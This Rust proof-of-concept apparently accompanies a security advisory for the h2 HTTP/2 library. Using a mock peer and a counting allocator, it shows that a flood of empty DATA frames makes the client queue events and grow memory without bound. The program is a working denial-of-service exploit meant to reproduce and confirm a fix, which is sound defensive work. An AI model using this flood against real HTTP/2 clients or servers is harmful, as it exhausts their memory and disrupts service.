// h2-1 / RUSTSEC-2026-0258 / PR #935 (fix 193833e).
// A peer streams many empty, non-final DATA frames on a response body the
// application has not yet drained. Empty frames consume no flow-control window,
// and at the baseline recv_data queues an Event::Data for every one of them with
// no frame-count or overhead budget, so the client retains one buffered event
// per frame without bound and never sends GOAWAY.
//
// We flood N empty DATA frames, let them all queue, snapshot live heap, then
// drain the body and snapshot again: the difference is the heap the queue itself
// held, and the number of drained chunks is the number of retained events. Both
// grow linearly with N and no ENHANCE_YOUR_CALM GOAWAY is ever sent.
//
// Exit 0 iff, for both sizes, the flood is accepted (chunks == N) and the
// retained queue heap grows about linearly with N.
use h2_support::prelude::*;
use h2_support::prelude::futures::StreamExt;
use std::alloc::{GlobalAlloc, Layout, System};
use std::sync::atomic::{AtomicUsize, Ordering::SeqCst};

struct Counting;
static LIVE: AtomicUsize = AtomicUsize::new(0);
unsafe impl GlobalAlloc for Counting {
    unsafe fn alloc(&self, l: Layout) -> *mut u8 {
        let p = System.alloc(l);
        if !p.is_null() {
            LIVE.fetch_add(l.size(), SeqCst);
        }
        p
    }
    unsafe fn dealloc(&self, p: *mut u8, l: Layout) {
        LIVE.fetch_sub(l.size(), SeqCst);
        System.dealloc(p, l)
    }
}
#[global_allocator]
static A: Counting = Counting;

// Returns (retained queue heap bytes, chunks drained, connection errored).
async fn measure(n: usize) -> (isize, usize, bool) {
    use tokio::sync::oneshot;
    let (io, mut srv) = mock::new();
    let (ready_tx, ready_rx) = oneshot::channel::<()>();
    let (flood_tx, flood_rx) = oneshot::channel::<()>();

    let peer = async move {
        srv.assert_client_handshake().await;
        srv.recv_frame(
            frames::headers(1)
                .request("GET", "https://example.com/")
                .eos(),
        )
        .await;
        srv.send_frame(frames::headers(1).response(200)).await;
        for _ in 0..n {
            srv.send_frame(frames::data(1, "")).await;
        }
        // Final non-empty, END_STREAM frame terminates the body.
        srv.send_frame(frames::data(1, "end").eos()).await;
        flood_tx.send(()).ok();
        idle_ms(1_000).await;
        drop(srv);
    };

    let peer_task = tokio::spawn(peer);
    let (mut client, conn) = client::handshake(io).await.unwrap();
    let conn_task = tokio::spawn(async move {
        conn.await.is_err()
    });

    let req = Request::builder()
        .uri("https://example.com/")
        .body(())
        .unwrap();
    let (resp, _) = client.send_request(req, true).unwrap();
    let resp = resp.await.unwrap();
    let mut body = resp.into_body();

    // Wait until the peer has queued the whole flood into the client.
    flood_rx.await.ok();
    // Let the connection ingest everything that is pending.
    idle_ms(50).await;
    let peak = LIVE.load(SeqCst) as isize;

    // Drain the body, counting retained chunks. Release capacity as we go.
    let mut chunks = 0usize;
    let mut errored = false;
    while let Some(next) = body.data().await {
        match next {
            Ok(bytes) => {
                let _ = body.flow_control().release_capacity(bytes.len());
                chunks += 1;
            }
            Err(_) => {
                errored = true;
                break;
            }
        }
    }
    let drained = LIVE.load(SeqCst) as isize;

    drop(body);
    drop(client);
    peer_task.abort();
    let _ = conn_task;
    (peak - drained, chunks, errored)
}

#[tokio::main(flavor = "current_thread")]
async fn main() {
    let small = 1_000usize;
    let big = 10_000usize;
    let (h_small, c_small, e1) = measure(small).await;
    let (h_big, c_big, e2) = measure(big).await;
    println!(
        "empty DATA flood: n={} -> {} chunks retained, queue held ~{} B",
        small, c_small, h_small
    );
    println!(
        "empty DATA flood: n={} -> {} chunks retained, queue held ~{} B",
        big, c_big, h_big
    );
    println!(
        "10x frames -> {:.2}x chunks, {:.2}x queue heap",
        c_big as f64 / c_small.max(1) as f64,
        h_big as f64 / h_small.max(1) as f64
    );
    // Bug: both floods accepted in full (no GOAWAY), chunk count == n (+1 for the
    // terminating frame), and retained heap grows roughly linearly.
    let accepted = !e1 && !e2 && c_small >= small && c_big >= big;
    let grows = h_small > 4_000 && (h_big as f64) > (h_small as f64) * 6.0;
    if accepted && grows {
        println!("DEMONSTRATED: unbounded queueing of empty DATA frames (no ENHANCE_YOUR_CALM)");
        std::process::exit(0);
    } else {
        println!("NOT demonstrated (flood bounded/rejected or heap growth sub-linear)");
        std::process::exit(1);
    }
}
